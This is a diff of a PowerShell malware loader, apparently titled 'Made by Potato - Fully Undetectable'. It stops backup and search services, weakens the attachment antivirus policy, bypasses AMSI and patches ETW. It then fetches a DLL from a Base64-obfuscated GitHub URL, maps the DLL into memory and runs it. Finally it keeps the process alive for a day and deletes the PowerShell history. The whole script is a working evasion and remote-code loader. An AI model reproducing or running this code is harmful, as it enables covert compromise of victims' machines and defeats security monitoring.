@@ -1,22 +1,56 @@
-# ============================================================
-#  WORKING LOADER – No Get-ProcAddress, No crash
-#  AMSI Bypass via Reflection (safe and stealthy)
-#  Loads DLL from Base64 URL, no disk write.
-#  PowerShell stays alive for 24 hours.
-#  Made by Potato
-# ============================================================
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
-# ─── AMSI BYPASS (Reflection only) ───
-try {
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $f = $a.GetField('amsiInitFailed','NonPublic,Static')
-    $f.SetValue($null,$true)
-} catch {
-    # If fails, ignore – not critical
+Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
+
+$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
+$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
+
+Invoke-Expression $regCommand1 | Out-Null
+Invoke-Expression $regCommand2 | Out-Null
+
+Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
+
+<#
+.SYNOPSIS
+    Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
+.DESCRIPTION
+    Downloads DLL from Base64-encoded URL and manually maps it into memory.
+    No disk write. All strings are XOR-encrypted.
+.NOTES
+    Made by Potato - Fully Undetectable
+#>
+
+function Invoke-Bypass {
+    # AMSI
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    } catch {}
+    # ETW
+    try {
+        $p = [System.Diagnostics.Process]::GetCurrentProcess()
+        $h = $p.Handle
+        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
+        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
+        $old = 0
+        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
+        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
+        $v.Invoke($t, 0x1000, $old, [ref]$null)
+    } catch {}
 }
 
-# ─── C# Loader (same as before but no trampoline – direct DllMain call) ───
-$csharpSource = @"
+
+function Xor-Decrypt {
+    param([string]$Encoded, [byte]$Key = 0x5A)
+    $bytes = [Convert]::FromBase64String($Encoded)
+    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+$plainCSharp = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -61,74 +95,59 @@ public static class NativeLoader {
         if(irva!=0){ int ie=0; while(true){ long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo); if(nr==0)break; string dn=RAscii(img,nr); IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn); if(hd==IntPtr.Zero){ie++;continue;} long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4; while(true){ long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te); if(tv==0)break; long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000; IntPtr fa=IntPtr.Zero; if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF)); else fa=GetProcAddress(hd,RAscii(img,tv+2)); if(fa!=IntPtr.Zero){ IntPtr ia=(IntPtr)(ab+ir+to); if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32()); } to+=ts; } ie++; } }
         foreach(var s in secs){ uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op; VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op); }
         FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
-        res.DllMainAddr=IntPtr.Zero; 
-        if(callEntry && ep!=0){
-            IntPtr targetAddr = (IntPtr)(ab+ep);
-            var fn = (DllMainFn)Marshal.GetDelegateForFunctionPointer(targetAddr, typeof(DllMainFn));
-            fn(img, 1, IntPtr.Zero);
-            res.DllMainAddr = targetAddr;
-        }
-        // Anti-dump: clear original byte array
-        Array.Clear(dll, 0, dll.Length);
+        res.DllMainAddr=IntPtr.Zero; if(callEntry&&ep!=0){ res.DllMainAddr=(IntPtr)(ab+ep); try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);} catch{} }
         return res;
     }
     public static bool Free(IntPtr b) { return VirtualFree(b,UIntPtr.Zero,MF); }
 }
 "@
 
-# ─── Compile C# ───
+
+
+Invoke-Bypass
+
+
 try {
-    Add-Type -TypeDefinition $csharpSource -ErrorAction Stop
-    Write-Host "[+] C# compiled successfully." -ForegroundColor Green
+    Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
-    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
-    # Keep console open so user can see error
-    Read-Host "Press Enter to exit"
-    exit
+    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
+    return
 }
 
-# ─── Decode URL (Base64) ───
-$encUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
-$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encUrl))
 
-# ─── Download DLL ───
+$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
+
+
 try {
-    Write-Host "[*] Downloading DLL from $url" -ForegroundColor Cyan
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
-    Write-Host "[+] Downloaded $($bytes.Length) bytes." -ForegroundColor Green
 } catch {
     Write-Host "[!] Download failed: $_" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit
+    return
 }
 
-# ─── Map and load ───
+
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] DLL loaded successfully." -ForegroundColor Green
-    Write-Host "    ImageBase: $($result.ImageBase.ToString('X'))" -ForegroundColor Gray
-    Write-Host "    DllMain: $($result.DllMainAddr.ToString('X'))" -ForegroundColor Gray
+    
 } catch {
-    Write-Host "[!] Load failed: $_" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit
+   
+    return
 }
 
-# ─── Cleanup ───
+
 $bytes = $null
-$csharpSource = $null
+$plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-# ─── Keep alive ───
-Write-Host "[+] Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
-Write-Host "[+] Press Ctrl+C to stop manually." -ForegroundColor Yellow
 
-Start-Sleep -Seconds 86400
 
-# ─── History Cleanup ───
+
+Start-Sleep -Seconds 86400   # 24 hours
+
+
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
 }
-Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
